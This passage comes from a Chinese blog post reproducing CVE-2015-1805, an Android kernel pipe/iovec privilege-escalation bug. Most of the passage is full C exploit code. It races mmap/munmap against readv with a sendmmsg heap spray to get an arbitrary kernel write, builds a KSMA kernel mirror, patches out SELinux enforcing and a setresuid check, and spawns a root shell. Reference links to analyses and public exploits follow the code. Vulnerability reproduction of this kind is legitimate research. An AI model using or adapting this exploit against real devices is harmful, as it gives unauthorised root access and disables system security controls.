class="keyword">int</span> kill_switch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> overflowcheck = MEMMAGIC;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> wbuf[<span class="number">4096</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">pipe_iovec</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>* <span class="title">sendmsg_iovec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sock_a;</span><br><span class="line">    <span class="keyword">int</span> sock_b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span> <span class="title">sockfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = getrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;getrlimit()&quot;</span>);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    <span class="keyword">if</span>((ret = setrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;setrlimit()&quot;</span>);          <span class="comment">// setfdlimit, 将能打开的文件描述数量开到最大</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] set RLIMIT_NOFILE to %d\\n&quot;</span>,rlim.rlim_cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setprocesspriority</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span>((ret = setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">-20</span>)) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;setpriority()&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change process priority to highest: %d\\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">mapunmap</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        munmap(MMAP_ADDR, MMAP_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mapunmap exit\\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writepipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], wbuf, <span class="keyword">sizeof</span>(wbuf));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;writepipe exit\\n&quot;</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">readpipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        readv(pipe_fd[<span class="number">0</span>], pipe_iovec, ((IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;readpipe exit\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsghdr</span> <span class="title">msg</span> =</span> &#123;&#123; <span class="number">0</span> &#125;, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span> , (<span class="keyword">int</span>*)&amp;sockfd);</span><br><span class="line"></span><br><span class="line">    msg.msg_hdr.msg_iov = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_iovlen = IOVEC_NUM;</span><br><span class="line">    msg.msg_hdr.msg_control = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_controllen = (IOVEC_NUM * <span class="keyword">sizeof</span>(struct iovec)); <span class="comment">// 都设置上，一次在内核中申请两个 kmalloc-8192</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!stop_send)</span><br><span class="line">    &#123;</span><br><span class="line">        syscall(__NR_sendmmsg, sockfd.sock_a, &amp;msg, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(sockfd.sock_a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">heapspray</span><span class="params">(<span class="keyword">void</span>* target_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">void</span>* retval;</span><br><span class="line">    <span class="keyword">pthread_t</span> msgthreads[SENDTHREADS];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>].iov_len = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">2</span>].iov_base = target_addr;</span><br><span class="line">    sendmsg_iovec[(IOVEC_NUM / <span class="number">2</span>) + <span class="number">2</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pthread_create(&amp;msgthreads[i], <span class="literal">NULL</span>, writemsg, <span class="literal">NULL</span>)) err(<span class="number">1</span>, <span class="string">&quot;heapspray pthread_create()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    stop_send = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)</span><br><span class="line">        pthread_join(msgthreads[i], &amp;retval);</span><br><span class="line">    stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aaw</span><span class="params">(<span class="keyword">void</span>* target_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> targetval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> mapthread, wthread, rthread;</span><br><span class="line"></span><br><span class="line">    kill_switch = <span class="number">0</span>;</span><br><span class="line">    overflowcheck = MEMMAGIC;                <span class="comment">// 多次使用，需重新初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start map/unmap thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;mapthread, <span class="literal">NULL</span>, mapunmap, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;mapunmap pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start write thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(wbuf) / <span class="keyword">sizeof</span>(targetval)); i++)                <span class="comment">// 待写入的值</span></span><br><span class="line">        ((<span class="keyword">long</span>*)wbuf)[i] = targetval;</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;wthread, <span class="literal">NULL</span>, writepipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;write pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] start heap spray, waiting....\\n&quot;</span>);</span><br><span class="line">    heapspray(target_addr);            <span class="comment">// 指定待写的目标地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start read thread\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;rthread, <span class="literal">NULL</span>, readpipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;read pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(overflowcheck != MEMMAGIC)</span><br><span class="line">        &#123;</span><br><span class="line">            kill_switch = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    [+] Done write\\n&quot;</span>);</span><br><span class="line">            <span class="comment">// printf(&quot;     overflowcheck : 0x%llx, sizeof(overflowcheck): %d \\n&quot;, overflowcheck, sizeof(overflowcheck));</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pthread_join(wthread,NULL);            // 有概率会卡住</span></span><br><span class="line">    pthread_join(mapthread,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(rthread,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel4</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x4</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> SYMBOL__swapper_pg_dir = <span class="number">0xFFFFFFC00007D000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mirror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys, <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base, <span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* one kernel write primitive to grant new mirror virtual space</span></span><br><span class="line"><span class="comment">     * 1. calculate d_block_addr</span></span><br><span class="line"><span class="comment">     * 2. prepare d_block (int64)</span></span><br><span class="line"><span class="comment">     * 3. write d_block to d_block_addr</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> d_block_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> d_block;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> index1 = (mirror_base &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>; <span class="comment">// bits[39:31]</span></span><br><span class="line">    d_block_addr = SYMBOL__swapper_pg_dir + index1 * <span class="number">8</span>;  <span class="comment">// target Table Descriptor Address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descriptor: 0x%lx + %d x 8 = 0x%lx\\n&quot;</span>, SYMBOL__swapper_pg_dir, index1, d_block_addr);</span><br><span class="line"></span><br><span class="line">    d_block = <span class="number">0</span>;</span><br><span class="line">    d_block |= <span class="number">0x1</span> ; <span class="comment">// Block entry</span></span><br><span class="line">    <span class="comment">/* Lower attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// bits[11], nG</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">10</span>); <span class="comment">// bits[10], AF</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">9</span>); <span class="comment">// bits[9], SH[1]</span></span><br><span class="line">    d_block |= <span class="number">0x40</span>; <span class="comment">// bits[7:6], AP[2:1] = 01</span></span><br><span class="line">    d_block |= <span class="number">0x20</span>; <span class="comment">// bits[5], NS</span></span><br><span class="line">    d_block |= <span class="number">0x10</span>; <span class="comment">// bits[2:0], AttrIndx[2:0]</span></span><br><span class="line">    d_block |= (kernel_phys &amp; <span class="number">0x0000ffffc0000000</span>); <span class="comment">// bits[47:30], output address</span></span><br><span class="line">    <span class="comment">/* Upper attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">52</span>); <span class="comment">// bits[52], Contiguous</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">53</span>); <span class="comment">// bits[53], PXN</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">54</span>); <span class="comment">// bits[54], XN</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d_block = 0x%lx\\n&quot;</span>, d_block);</span><br><span class="line">    aaw((<span class="keyword">void</span>*)d_block_addr, d_block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    maximize_fd_limit();</span><br><span class="line">    setprocesspriority();         </span><br><span class="line"></span><br><span class="line"><span class="comment">// init global value</span></span><br><span class="line">    <span class="comment">/*mmap unmap addr*/</span></span><br><span class="line">    <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line">    <span class="comment">/*readv iovec*/</span></span><br><span class="line">    pipe_iovec = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="built_in">memset</span>(pipe_iovec, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r_buf[<span class="number">2</span>];</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;           <span class="comment">//just any buffer that is always available</span></span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;         <span class="comment">//how many bytes we can arbitrary write</span></span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);          <span class="comment">//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes) </span></span><br><span class="line">    <span class="comment">/*heap spray - sendmsg iovec*/</span></span><br><span class="line">    sendmsg_iovec = <span class="built_in">malloc</span>(IOVEC_NUM*<span class="keyword">sizeof</span>(struct iovec));</span><br><span class="line">    <span class="built_in">memset</span>(sendmsg_iovec, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line"></span><br><span class="line"><span class="comment">// init pipe_fd                        // 创建管道，并将其大小设置为 32*4096，防止读pipe时被阻塞</span></span><br><span class="line">    <span class="keyword">if</span>((ret = pipe(pipe_fd))) err(<span class="number">1</span>, <span class="string">&quot;pipe()&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[<span class="number">1</span>], F_SETPIPE_SZ, PIPESZ) != PIPESZ) err(<span class="number">1</span>, <span class="string">&quot;fcntl()&quot;</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">// aaw test</span></span><br><span class="line">    <span class="comment">// unsigned long test = 0;</span></span><br><span class="line">    <span class="comment">// aaw(&amp;test, 0xffffaaaacccc);</span></span><br><span class="line">    <span class="comment">// printf(&quot;[+] test: 0x%llx\\n&quot;, test);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit    </span></span><br><span class="line">    <span class="comment">/*ksma*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys = <span class="number">0x40080000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base = <span class="number">0xffffffc200000000</span>;</span><br><span class="line">    init_mirror(kernel_phys, mirror_base, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/*PATCH KERNEL - turn off selinux*/</span></span><br><span class="line">    <span class="keyword">void</span>* selinux_enforcing = <span class="number">0xFFFFFFC0006EBA0C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_new = mirror_base + <span class="number">0x80000</span> + (selinux_enforcing - KERNEL_IMAGE_VBASE);    </span><br><span class="line">    *(<span class="keyword">int</span>*)selinux_enforcing_new = <span class="number">0x0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done, turn off the selinux\\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*PATCH KERNEL - sys_setresuid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr = <span class="number">0xFFFFFFC0000ADF44</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr_new = mirror_base + <span class="number">0x80000</span> + (setresuid_if_addr - KERNEL_IMAGE_VBASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid new addr:0x%lx\\n&quot;</span>, setresuid_if_addr_new);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new content: 0x%lx\\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(setresuid_if_addr_new));</span><br><span class="line">    *(<span class="keyword">char</span>*)(setresuid_if_addr_new+<span class="number">3</span>) = <span class="number">0xB4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new content: 0x%lx\\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(setresuid_if_addr_new));</span><br><span class="line"></span><br><span class="line"><span class="comment">// write cred</span></span><br><span class="line">    <span class="keyword">uid_t</span> a,b,c;</span><br><span class="line">    <span class="keyword">if</span>(getresuid(&amp;a, &amp;b, &amp;c) != <span class="number">0</span>) err(<span class="number">1</span>,<span class="string">&quot;getresuid&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before set - getresuid: %d %d %d\\n&quot;</span>,a, b, c);</span><br><span class="line">    <span class="keyword">if</span>(setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) != <span class="number">0</span>) err(<span class="number">1</span>,<span class="string">&quot;setresuid&quot;</span>);            <span class="comment">// b *0xFFFFFFC0000ADEF4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getresuid(&amp;a, &amp;b, &amp;c) != <span class="number">0</span>) err(<span class="number">1</span>,<span class="string">&quot;getresuid&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after set - getresuid: %d %d %d\\n&quot;</span>,a, b, c);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit...should never be there\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>执行效果：</p>
<p><img   src="image-20231113015923671.png?size=600" style="width: 600px;"  alt="image-20231113015923671"></p>

        <h1 id="参考文章"   >
          <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1>
      <p>看明白漏洞点：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.retme.net/index.php/2016/03/19/some-points-on-cve-2015-1805.html" >some points on CVE-2015-1805</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>有个dosomder/iovyroot代码和ppt：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://h3ysatan.blogspot.com/2016/04/iovyroot-cve-2015-1805.html" >Iovyroot (CVE-2015-1805) 分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>讲解dosomder/iovyroot代码：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wenboshen.org/posts/2016-04-25-1805-cve" >https://wenboshen.org/posts/2016-04-25-1805-cve</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>一个分析，在多个真机上复现：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-210503.htm" >原创][首发]CVE-2015-1805 安卓手机提权ROOT漏洞 分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>一个国外的博客：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://web.archive.org/web/20201112020258/https://www.trendmicro.com/en_us/research/16/c/critical-cve-2015-1805-vulnerability-allows-permanent-rooting-android-phones.html" >http://web.archive.org/web/20201112020258/https://www.trendmicro.com/en_us/research/16/c/critical-cve-2015-1805-vulnerability-allows-permanent-rooting-android-phones.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>keenlab-mosec2016-PPT：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/retme7/My-Slides/blob/master/Keenlab-mosec2016.pdf" >https://github.com/retme7/My-Slides/blob/master/Keenlab-mosec2016.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>exp:</p>
<ul>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dosomder/iovyroot" >https://github.com/dosomder/iovyroot</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://forum.xda-developers.com/t/root-exploit-cve-2015-1805-iovyroot-by-zxz0o0.3354728/" >https://forum.xda-developers.com/t/root-exploit-cve-2015-1805-iovyroot-by-zxz0o0.3354728/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/android/">android</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/pipe/">pipe</a></span></div><div class="post-share"><div class="social-share" data-sites="qq, weibo, wechat, twitter">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/11/06/231106-cve-2019-2215/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CVE-2019-2215 漏洞复现 - bad binder</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/11/06/231106-cve-2014-3153/"><span class="paginator-prev__text">CVE-2014-3153 漏洞复现 - towelroot</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
          漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">
          漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">
          环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">
          poc验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%80%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%80%81%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          往任意用户态地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%80%E4%BB%BB%E6%84%8F%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.2.2.</span> <span class="toc-text">
          往任意内核地址写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ptmx-fop%E2%86%92check-flags"><span class="toc-number">3.1.</span> <span class="toc-text">
